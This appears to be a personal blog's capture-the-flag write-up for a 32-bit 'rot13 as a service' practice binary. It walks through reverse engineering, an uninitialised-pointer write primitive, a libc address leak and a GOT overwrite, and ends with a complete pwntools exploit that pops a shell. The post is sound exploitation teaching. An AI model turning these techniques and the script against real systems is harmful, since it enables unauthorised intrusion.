<!doctype html><html lang=en-US><head><meta charset=UTF-8><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="index, follow"><meta name=author content="dilag"><meta name=description content="Uninitialised variable bug to write anywhere ain memory"><link rel=author type=text/plain href=/humans.txt><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon href=/favicon.ico type=image/x-icon><link rel=icon href=https://dilagluc.github.io/images/favicon.min.svg type=image/svg+xml><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileImage content="/mstile-144x144.png"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><link rel=mask-icon href=/safari-pinned-tab.svg color=#494f5c><meta itemprop=name content="Pwnyracing: Chall01"><meta itemprop=description content="Uninitialised variable bug to write anywhere ain memory"><meta itemprop=datePublished content="2022-09-11T21:34:43+02:00"><meta itemprop=dateModified content="2022-09-11T21:34:43+02:00"><meta itemprop=wordCount content="2766"><meta itemprop=image content="https://dilagluc.github.io/images/blog/2022/06/background.jpg"><meta itemprop=keywords content="Pwn,Ctf"><meta property="og:url" content="https://dilagluc.github.io/en/posts/2022/pwnyracing/pwnyracing/"><meta property="og:site_name" content="Blog"><meta property="og:title" content="Pwnyracing: Chall01"><meta property="og:description" content="Uninitialised variable bug to write anywhere ain memory"><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-11T21:34:43+02:00"><meta property="article:modified_time" content="2022-09-11T21:34:43+02:00"><meta property="article:tag" content="Pwn"><meta property="article:tag" content="Ctf"><meta property="og:image" content="https://dilagluc.github.io/images/blog/2022/06/background.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://dilagluc.github.io/images/blog/2022/06/background.jpg"><meta name=twitter:title content="Pwnyracing: Chall01"><meta name=twitter:description content="Uninitialised variable bug to write anywhere ain memory"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Pwnyracing: Chall01","name":"Pwnyracing: Chall01","description":"Uninitialised variable bug to write anywhere ain memory","keywords":["pwn","ctf"],"articleBody":"Hello everyone,\nI hope that you’re well. Last time, I found on twitter an interesting set of challenges made by 0xb0bb. After taking a look on it, I saw directly that I could learn new things with this, so I decided to do a writeup for some of them. You can find the challenges here. I’m going to try the first one. Let’s start.\nFirst look We’re going to do the things like a real ctf challenges, all we need is on dist directory. Let’s take a look on it. We’re given two files, an stripped ELF 32 binary file and libc file. Let’s check a security mecanism used:\n└──╼ $pwn checksec chall01 [*] '/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) We can see that there is a partial relro, a canary and non executable stack(we supposed also that PIE is enabled).\nBefore start anything, we need to patch the binary to use a correct libc file (I made this mistake and found myself searching for days and days what’s wrong). We will use pwninit for this:\n└──╼ $pwninit bin: ./chall01 libc: ./libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1_i386.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_i386.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) setting ./ld-2.27.so executable copying ./chall01 to ./chall01_patched running patchelf on ./chall01_patched writing solve.py stub Now we have a patched binary file which use the right libc. Let run the binary and see what we have :\nWelcome to rot13 as a service! - For all those hard \"sanity flag\" CTF challenges size: 10 data: AAAAAAAAA resp: NNNNNNNNN more? (y/n): y size: 2 data: AAAAAAA resp: NNNNNNN more? (y/n): n bye ..... So we can see the binary asks for a size and data and performs a rot13 operation on this data. Let’s reverse it and see what we can do.\nReversing Looking at the decompiled code in Ghidra, we find quickly the function that handling the operation.\n{ char *pcVar1; int iVar2; int in_GS_OFFSET; char local_61; size_t local_60; void *local_5c; char local_58 [64]; char *local_18; undefined4 local_14; int local_10; local_10 = *(int *)(in_GS_OFFSET + 0x14); local_14 = 0; local_60 = 0; local_5c = (void *)0x0; local_61 = '\\0'; do { if ('\\0' \u003c local_61) { iVar2 = getchar(); local_61 = (char)iVar2; if (local_61 != '\\n') { ungetc((int)local_61,stdin); } } local_60 = 0; printf(\"\\nsize: \"); __isoc99_scanf(\"%d%*c\",\u0026local_60); if (local_60 \u003c 0x49) { local_60 = 0x48; } printf(\"data: \"); local_18 = local_58; while( true ) { iVar2 = getchar(); local_61 = (char)iVar2; if (((local_61 == -1) || (local_61 == '\\n')) || (local_61 == '\\r')) break; pcVar1 = local_18 + 1; *local_18 = local_61; local_18 = pcVar1; } if (local_61 == '\\n') { pcVar1 = local_18 + 1; *local_18 = '\\0'; local_18 = pcVar1; } local_5c = malloc(local_60); FUN_080488b4(local_58,local_5c,local_60); printf(\"resp: %s\\n\",local_5c); printf(\"more? (y/n): \"); memset(local_58,0,0x40); iVar2 = __isoc99_scanf(\u0026DAT_08050c5e,\u0026local_61); } while ((iVar2 != 0) \u0026\u0026 ((local_61 == 'y' || (local_61 == 'Y')))); FUN_0804883e(); if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) { FUN_08048d40(); } return; } So we can see it asks for a size and sets it to 0x48 if size \u003c 0x49. Size is saved into local_60 variable. After that it asks for a data, sets local_18 pointer to local_58 buffer and starts reading data byte by byte into this buffer. So basically it uses local_18 pointer to write into local_58 buffer and since local_18 pointer is right after the buffer we can write into that pointer, but we can just rewrite the LSB to point to another location. Let’s see it with gdb:\n0x8048aee:\tcall 0x80485a0 \u003cprintf@plt\u003e //ask for data 0x8048af3:\tadd esp,0x10 0x8048af6:\tlea eax,[ebp-0x54] 0x8048af9:\tmov DWORD PTR [ebp-0x14],eax 0x8048afc:\tjmp 0x8048b0d 0x8048afe:\tmov eax,DWORD PTR [ebp-0x14] 0x8048b01:\tlea edx,[eax+0x1] 0x8048b04:\tmov DWORD PTR [ebp-0x14],edx 0x8048b07:\tmovzx edx,BYTE PTR [ebp-0x5d] 0x8048b0b:\tmov BYTE PTR [eax],dl 0x8048b0d:\tcall 0x80485c0 \u003cgetchar@plt\u003e We can see that after asking for data, it loads ebp-0x54 address into eax and sets ebp-0x14 address to eax, so we can conclude that buffer is at ebp-0x54 and pointer at ebp-0x14.\ngef➤ p $ebp-0x54 $6 = (void *) 0xffffd064 gef➤ p $ebp-0x14 $7 = (void *) 0xffffd0a4 gef➤ x/30xw 0xffffd064 0xffffd064:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd074:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd084:\t0x41414141\t0xff004141\t0x08048824\t0x08050b9c 0xffffd094:\t0xf7feae20\t0xf7e5a2bb\t0x080487f2\t0xf7fca000 0xffffd0a4:\t0xffffd08b\t0x00000000\t0xff953d00\t0xf7fcad80 0xffffd0b4:\t0x08052000\t0xffffd078\t0x08048cad\t0x00000000 0xffffd0c4:\t0x5e1b0751\t0x60e6a141\t0x00000000\t0x00000000 0xffffd0d4:\t0x00000000\t0x00000001 We can see that the value at 0xffffd0a4 address is the address where 0x41 end, this is our pointer. We’re on the right way :)\nAnother thing we can see in a decompiled code generated by Ghidra is our buffer is null byte terminate if only the input is \\n. If our input is \\r, we go to the malloc call without null terminated the buffer.\nAfter asking for data, the program calls malloc with our size and calls FUN_080488b4 with buffer, malloc result and size. Let’s see FUN_080488b4:\nvoid FUN_080488b4(char *param_1,char *param_2,int param_3) { char cVar1; char *pcVar2; ushort **ppuVar3; int iVar4; int in_GS_OFFSET; undefined auStack96 [16]; undefined4 uStack80; int local_48; char *local_44; char *local_40; char *local_34; undefined *local_30; size_t local_2c; int local_28; char *local_24 [4]; undefined4 local_14; int local_10; uStack80 = 0x80488c1; local_40 = param_1; local_44 = param_2; local_48 = param_3; local_10 = *(int *)(in_GS_OFFSET + 0x14); local_24[2] = (char *)0x0; local_24[3] = (char *)0x0; local_14 = 0; local_24[0] = \"abcdefghijklmnopqrstuvwxyz\"; local_24[1] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; local_30 = auStack96; local_2c = strlen(\"abcdefghijklmnopqrstuvwxyz\"); local_28 = 0xd; if (local_44 != (char *)0x0) { local_34 = local_44; } while ((*local_40 != '\\0' \u0026\u0026 (local_48 = local_48 + -1, local_48 != 0))) { ppuVar3 = __ctype_b_loc(); if (((*ppuVar3)[*local_40] \u0026 0x400) == 0) { *local_34 = *local_40; local_40 = local_40 + 1; local_34 = local_34 + 1; } else { ppuVar3 = __ctype_b_loc(); pcVar2 = local_24[(int)(uint)(*ppuVar3)[*local_40] \u003e\u003e 8 \u0026 1]; cVar1 = *local_40; local_40 = local_40 + 1; iVar4 = tolower((int)cVar1); *local_34 = pcVar2[(local_28 + iVar4 + -0x61) % (int)local_2c]; local_34 = local_34 + 1; } } if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) { FUN_08048d40(); } return; } It basically checks if local_44 which is malloc result is not null and if it’s not null it sets local_34 pointer to local_44 pointer. The problem here is that local_34 is not initialized before the check, so if the check failed, local_34 will be whatever was on the stack. This can let us write at whatever address was on stack. After that it performs the rot13 operation on local_40 which is our buffer and copies the result into local_34.\nExploitation So we have the ability to alter the LSB of the pointer to point to another location and also the ability to write into uninitialized pointer variable if the malloc call fail. Since the uninitialized variable is on the next stack frame (at lowers addresses), we can alter the LSB of the pointer to point to next stack frame, write a desired pointer address into the uninitialized pointer address and wait for rot13 operation into that address. Now the question is how can we fail malloc call. Since the malloc is in user controll it is pretty easy to fail it, by simply give too large size that can not be served. In this case a simple -1 will do it .\ngef➤ c Continuing. size: -1 data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Breakpoint 7, 0x08048b48 in ?? () [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────── registers ──── $eax : 0xffffffff $ebx : 0x08052000 → 0x08051f0c → \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]\" $ecx : 0xffffffff $edx : 0xffffd088 → 0xffffd0b8 → 0xffffd078 → \"AAAAAAAAAAAAAAA\" $esp : 0xffffd040 → 0xffffffff $ebp : 0xffffd0b8 → 0xffffd078 → \"AAAAAAAAAAAAAAA\" $esi : 0xf7fca000 → 0x001d7d6c $edi : 0x0 $eip : 0x08048b48 → call 0x8048620 $eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 ────────────────────────────────────────────────────────────────────────── stack ──── 0xffffd040│+0x0000: 0xffffffff\t← $esp 0xffffd044│+0x0004: 0x00000000 0xffffd048│+0x0008: 0xffffd0b8 → 0xffffd078 → \"AAAAAAAAAAAAAAA\" 0xffffd04c│+0x000c: 0x08048b12 → mov BYTE PTR [ebp-0x5d], al 0xffffd050│+0x0010: 0xf7fcad80 → 0xfbad2887 0xffffd054│+0x0014: 0x0000000a (\"\\n\"?) 0xffffd058│+0x0018: 0x0a000058 (\"X\"?) 0xffffd05c│+0x001c: 0xffffffff ──────────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048b41 mov eax, DWORD PTR [ebp-0x5c] 0x8048b44 sub esp, 0xc 0x8048b47 push eax ●→ 0x8048b48 call 0x8048620 ↳ 0x8048620 jmp DWORD PTR ds:0x805202c 0x8048626 push 0x40 0x804862b jmp 0x8048590 0x8048630 jmp DWORD PTR ds:0x8052030 0x8048636 push 0x48 0x804863b jmp 0x8048590 ──────────────────────────────────────────────────────────── arguments (guessed) ──── malloc@plt ( [sp + 0x0] = 0xffffffff, [sp + 0x4] = 0x00000000 ) ──────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"chall01_patched\", stopped 0x8048b48 in ?? (), reason: BREAKPOINT ────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x8048b48 → call 0x8048620 [#1] 0x8048cad → mov eax, 0x0 ───────────────────────────────────────────────────────────────────────────────────── gef➤ ni 0x08048b4d in ?? () [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────── registers ──── $eax : 0x0 $ebx : 0x08052000 → 0x08051f0c → \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]\" $ecx : 0x0 $edx : 0x0 $esp : 0xffffd040 → 0xffffffff $ebp : 0xffffd0b8 → 0xffffd078 → \"AAAAAAAAAAAAAAA\" $esi : 0xf7fca000 → 0x001d7d6c $edi : 0x0 $eip : 0x08048b4d → add esp, 0x10 $eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 ────────────────────────────────────────────────────────────────────────── stack ──── 0xffffd040│+0x0000: 0xffffffff\t← $esp 0xffffd044│+0x0004: 0x00000000 0xffffd048│+0x0008: 0xffffd0b8 → 0xffffd078 → \"AAAAAAAAAAAAAAA\" 0xffffd04c│+0x000c: 0x08048b12 → mov BYTE PTR [ebp-0x5d], al 0xffffd050│+0x0010: 0xf7fcad80 → 0xfbad2887 0xffffd054│+0x0014: 0x0000000a (\"\\n\"?) 0xffffd058│+0x0018: 0x0a000058 (\"X\"?) 0xffffd05c│+0x001c: 0xffffffff ──────────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048b44 sub esp, 0xc 0x8048b47 push eax ● 0x8048b48 call 0x8048620 → 0x8048b4d add esp, 0x10 0x8048b50 mov DWORD PTR [ebp-0x58], eax 0x8048b53 mov eax, DWORD PTR [ebp-0x5c] 0x8048b56 sub esp, 0x4 0x8048b59 push eax 0x8048b5a push DWORD PTR [ebp-0x58] ──────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"chall01_patched\", stopped 0x8048b4d in ?? (), reason: SINGLE STEP ────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x8048b4d → add esp, 0x10 [#1] 0x8048cad → mov eax, 0x0 ───────────────────────────────────────────────────────────────────────────────────── gef➤ p $eax $8 = 0x0 gef➤ We can see here that the malloc call failed. Let’s see now where is the uninitialized variable:\n0x804895c:\tcmp DWORD PTR [ebp-0x40],0x0 0x8048960:\tje 0x8048a0b 0x8048966:\tmov eax,DWORD PTR [ebp-0x40] 0x8048969:\tmov DWORD PTR [ebp-0x30],eax 0x804896c:\tjmp 0x8048a0b 0x8048971:\tcall 0x80486b0 \u003c__ctype_b_loc@plt\u003e . . . gef➤ p $ebp-0x30 $12 = (void *) 0xffffd008 We can see here that it compares [ebp-0x40] address with 0x0 and if not null, it sets [ebp-0x30] to [ebp-0x40] address, so we can conclude that our uninitialized variable is at ebp-0x30 which is 0xffffd008. And since our pointer is at 0xffffd064, we can alter the LSB with 0x08 so that we point to 0xffffd008 location and we can write the desire pointer address to it, the rot13 operation will be performed into that address.\nLet’s run this simple code to demonstrate it:\n#!/usr/bin/env python3 from pwn import * exe = ELF(\"./chall01_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.27.so\") context.binary = exe target = process([exe.path]) target.recvuntil(b\"size: \") target.sendline(b\"-1\") target.recvuntil(b\"data: \") payload = b\"\" payload += b\"AAAAAAAAAAAAAAAAAAAAAAA\" # what to write at address payload += b\"\\x00\" # null terminate it to ensure everything is ok payload += b\"A\" * (64-len(payload)) # fill the buffer until the pointer is reached payload += b\"\\x08\" # overwrite LSB with 0x8 (the pointer will point now to unintialized variable location ) payload += p32( 0x41424344 ) # write our unintialized variable pointer address (address where we want to write ) pause() target.sendline(payload) pause() target.interactive() In gdb, before the malloc,\ngef➤ x/30xw $esp 0xffffd044:\t0x00000000\t0xffe7a9b8\t0x08048b12\t0xf7f2bd80 0xffffd054:\t0x0000000a\t0x0a000058\t0xffffffff\t0x00000000 0xffffd064:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd074:\t0x41414141\t0x00414141\t0x41414141\t0x41414141 0xffffd084:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd094:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd0a4:\t0xffe7a90d\t0x00000000\t0xad56ed00\t0xf7f2bd80 0xffffd0b4:\t0x08052000\t0xffe7a998 gef➤ x/30xw 0xffe7a900 0xffffd000:\t0xf7f2b5c0\t0x08047284\t0x41424344\t0xf7dc6f00 0xffffd010:\t0xf7dc7277\t0x08052000\t0xf7f2b5c0\t0xf7dc1329 0xffffd020:\t0xf7f2b5c0\t0x08052000\t0xf7f2b000\t0x00000000 0xffffd030:\t0xffe7a9b8\t0xf7f4be20\t0xf7f2c890\t0x08052000 0xffffd040:\t0xf7f2b000\t0x00000000\t0xffe7a9b8\t0x08048b12 0xffffd050:\t0xf7f2bd80\t0x0000000a\t0x0a000058\t0xffffffff 0xffffd060:\t0x00000000\t0x41414141\t0x41414141\t0x41414141 0xffffd070:\t0x41414141\t0x41414141 gef➤ We can see that at 0xffffd008 , we have our pointer 0x41424344 and this is where it will write the rot13 result. Here it end with Segmantation Fault because this is a non valid address. So now we know how to write to any address (but we should pay attention to rot13 transformation). We can overwrite a GOT address of a given function with the address of system, so that if we call this function it will call system instead. But we need a function whose the first argument we control because we want system to call /bin/sh. memset is a good candidate since her first argument is our buffer (our inputed data). So we will overwrite memset GOT with the address of system using our uninitialised buffer primitive and for the next input we will give /bin/sh as data so that at memset call , we will have a shell.\nBut wait, how can we have a right system address ? we need the infoleak to figure out where the system is.\nInfoleak Remember that we suppose PIE is enabled, so we need a libc infoleak to break ASLR and call system. The libc infoleak will allow us to break ASLR and know the address of everything. At first glance, we can think that the program don’t give us any read primitive, but it’s not true. Remember the famous \\r I talked about. Our buffer will not be null byte terminated if we send it and since printf print all bytes up to a null byte and after the rot13 operation our output buffer will also not be null byte terminated , the printf(\"resp: %s\\n\",local_5c); calls will print all the bytes until reaching null byte. This leak some address as we can see below:\n[+] Starting local process '/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01_patched': pid 371389 b'resp: NNNN\\x80\\xad\\xf7\\xf7\\x87(\\xad\\xfb\\xb8\\xe2\\xc2\\xff \\xae\\xf9\\xf7X\\x9b\\xe0\\xf7\\n' (gdb) x/30xw 0x950d160 0x984b160:\t0x4e4e4e4e\t0xf7f7ad80\t0xfbad2887\t0xffc2e2b8 0x984b170:\t0xf7f9ae20\t0xf7e09b58\t0x00000000\t0x00000000 0x984b180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 (gdb) x/xw 0xf7fc2d80 0xf7fc2d80 \u003c_IO_2_1_stdout_\u003e:\t0xfbad2887 (gdb) x/xw 0xfbad2887 0xfbad2887:\tCannot access memory at address 0xfbad2887 (gdb) x/xw 0xf7fe2e20 0xf7fe2e20:\t0x240c8b5a (gdb) x/xw 0xf7e51b58 0xf7e51b58 :\t0x00031644 So we can see that the last one is a libc address of puts+11. We can simply use it to have our libc infoleak. The last thing we need is a function that can convert back from rot13 or convert to rot13 because the rot13 operation can alter some byte in our pointer, so we need to pay attention to it. I simply create a function that for the conversion stuff. So we obtain our leak:\n[*] Leak puts+11 @ 0xf7dd0b4b [*] Libc base @ 0xf7d69000 [*] Addr system @ 0xf7da6200 [*] Addr execl @ 0xf7e28870 We can see here that system address contain a null byte and this is a problem for us because the overwrite process will stop at null byte. However, this is not a big problem, we can call others functions like execve , execl instead of system. execl is a good candidate because it doesn’t require envp pointer. So we’re going to call execl to get a shell.\nExploit Putting it all together, we get the following exploit:\n#!/usr/bin/env python3 from pwn import * exe = ELF(\"./chall01_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.27.so\") context.binary = exe target = process([exe.path]) #gdb.attach(target, ' source ~/breakpoint.txt') #### Infoleak target.recvuntil(b\"size: \") target.sendline(b\"1\") target.recvuntil(b\"data: \") target.send( b\"AAAA\" + b'\\r') recv = target.recvline() #### print(recv ) b_leak_puts_11 = recv[-5: -1] def rot13_f(string=b\"\"): rot13 = str.maketrans( 'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz', 'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm') #print(bytearray(string)) b = bytearray(string) for i in range(len(b)): if(chr(b[i]).isalnum() == True): b[i] = ord(chr(b[i]).translate(rot13)) #print(b) return bytes(b) leak_puts_11 = rot13_f(b_leak_puts_11) log.info( \"Leak puts+11 @ \" + hex(u32(leak_puts_11)) ) libc.address = u32(leak_puts_11) - libc.symbols['puts'] - 11 log.info(\"Libc base @ \" + hex(libc.address)) log.info( \"Addr system @ \" + hex( libc.symbols['system']) ) log.info( \"Addr execl @ \" + hex( libc.symbols['execl']) ) target.sendline(b\"y\") target.recvuntil(b\"size: \") target.sendline(b\"-1\") target.recvuntil(b\"data: \") payload = b\"\" #payload += rot13_f( p32( libc_base + libc.symbols['execl'])) payload += rot13_f( p32( libc.symbols['execl'])) payload += b\"\\x00\" #payload += rot13_f( p32( libc_base + libc.symbols['system'])) payload += b\"A\" * (64-len(payload)) payload += b\"\\x08\" #payload += b\"A\"*8 payload += p32( exe.got['memset'] ) target.sendline(payload) target.sendline(b\"y\") target.sendline(b\"1\") target.sendline(b\"/bin/sh\") target.interactive() And when we run it:\n[+] Starting local process '/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01_patched': pid 373291 b'resp: NNNN\\x80\\xbd\\xf0\\xf7\\x87(\\xad\\xfb\\xb8\\x18\\xeb\\xff \\xbe\\xf2\\xf7X\\xab\\xd9\\xf7\\n' [*] Leak puts+11 @ 0xf7d9ab4b [*] Libc base @ 0xf7d33000 [*] Addr system @ 0xf7d70200 [*] Addr execl @ 0xf7df2870 [*] Switching to interactive mode resp: (null) more? (y/n): size: data: resp: /ova/fu more? (y/n): $ ls chall01 chall01_patched core ld-2.27.so libc.so.6 solve.py test.py $ ls chall01 chall01_patched core ld-2.27.so libc.so.6 solve.py test.py $ id uid=0(root) gid=0(root) groups=0(root) $ That is all for this first challenge. Hope that you enjoyed it. Bye and See you next time for a new challenge.\n","wordCount":"2766","inLanguage":"en","image":"https://dilagluc.github.io/images/blog/2022/06/background.jpg","datePublished":"2022-09-11T21:34:43+02:00","dateModified":"2022-09-11T21:34:43+02:00","author":{"@type":"Person","name":"dilag","url":"https://dilagluc.github.io/en/about-dilag/"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://dilagluc.github.io/en/posts/2022/pwnyracing/pwnyracing/"},"publisher":{"@type":"Organization","name":"Blog","description":"Continuing Hermit\u0026#39;s legacy to be minimal and fast theme","logo":{"@type":"ImageObject","url":"https://dilagluc.github.io/favicon.ico"}}}</script><title>Pwnyracing: Chall01</title><link rel="stylesheet dns-prefetch preconnect preload prefetch" as=style media=screen href=https://dilagluc.github.io/css/style.min.cbb61c13ffe36e23de11896ce5cb9f37cf539353029dd4d553dddd3403b2d24e.css integrity="sha256-y7YcE//jbiPeEYls5cufN89Tk1MCndTVU93dNAOy0k4=" crossorigin=anonymous><style>.bg-img{background-image:url(https://dilagluc.github.io/images/blog/2022/06/background.jpg)}</style></head><body id=page><header id=site-header><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://dilagluc.github.io/>Blog</a></div><nav class="site-nav hide-in-mobile"><a href=https://dilagluc.github.io/en/posts/>Posts</a><a href=https://dilagluc.github.io/en/about-dilag/>About Me</a></nav></div><div class="hdr-right hdr-icons"><button id=img-btn class=hdr-btn title="Featured Image"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-image"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></button><span class="hdr-links hide-in-mobile"><a href=https://github.com/dilagluc/ target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://github.com/1bl4z3r/hermit-V2/tree/staging target=_blank rel="noopener me" title=Discord><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M8.82889 11.203C7.86239 11.203 7.09937 12.0508 7.09937 13.0852c0 1.0343.779979999999999 1.8821 1.72952 1.8821C9.79538 14.9673 10.5584 14.1195 10.5584 13.0852 10.5754 12.0508 9.79538 11.203 8.82889 11.203zm6.18891.0c-.9664.0-1.7295.847800000000001-1.7295 1.8822.0 1.0343.780000000000001 1.8821 1.7295 1.8821.9665.0 1.7296-.847799999999999 1.7296-1.8821.0-1.0344-.7631-1.8822-1.7296-1.8822z" fill="currentcolor"/><path d="M14.8477 18.3649C14.8874 18.4483 14.9381 18.5296 15.0005 18.6075 15.3663 19.0644 15.7387 19.5135 15.8832 19.687 16.1242 19.9764 16.4855 20.1329 16.8553 20.117c3.8286-.1648 5.55-2.5107 5.8573-2.9828C22.8526 16.919 22.9029 16.6887 22.9023 16.4867 22.8862 11.0873 20.6126 6.69288 20.3618 6.22299 20.2686 6.04849 20.1448 5.9213 20.0223 5.83024c-2.3899-1.77582-4.6825-1.93766-5.2236-1.95079C14.4248 3.87037 14.1018 4.039 13.8908 4.28019 13.7833 4.40298 13.7069 4.53817 13.659 4.67843 12.4808 4.5498 11.3488 4.5684 10.3271 4.681 10.2848 4.54257 10.2137 4.40813 10.1111 4.28494 9.90289 4.03513 9.58304 3.87239 9.22517 3.87894 8.72884 3.88801 6.40341 4.02781 3.9777 5.83024 3.85516 5.9213 3.73139 6.04849 3.63825 6.22299c-.25083.4699-2.5246 4.86461-2.54051 10.26431C1.09715 16.6871 1.14634 16.9155 1.28416 17.1296 1.58866 17.6027 3.29601 19.9515 7.12649 20.1169 7.50079 20.1331 7.86486 19.9726 8.10512 19.6794 8.2521 19.5 8.63516 19.0311 9.00416 18.5683 9.06865 18.4874 9.12057 18.4028 9.16075 18.316 9.32759 18.3546 9.49869 18.391 9.67405 18.4248L9.68004 18.426C11.0465 18.681 12.6626 18.7747 14.4312 18.4443 14.5698 18.4206 14.7086 18.3942 14.8477 18.3649z" stroke="currentcolor" stroke-width="2"/></svg></a><a href=https://x.com/dilag_luc target=_blank rel="noopener me" title=X><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path class="st0" d="m21.3 21.1L9.9 2.9H2.7l11.4 18.2zm-18.6.0 7.2-6.6m4.2-5 7.2-6.6"/></svg></a></span><button id=share-btn class=hdr-btn title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button><div id=share-links class="animated fast"><ul><li><a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2022%2fpwnyracing%2fpwnyracing%2f&amp;text=Pwnyracing%3a%20Chall01" target=_blank rel=noopener aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path class="st0" d="m21.3 21.1L9.9 2.9H2.7l11.4 18.2zm-18.6.0 7.2-6.6m4.2-5 7.2-6.6"/></svg></a></li><li><a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2022%2fpwnyracing%2fpwnyracing%2f" target=_blank rel=noopener aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a></li><li><a href="mailto:?subject=Pwnyracing%3a%20Chall01&amp;body=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2022%2fpwnyracing%2fpwnyracing%2f" target=_self rel=noopener aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline 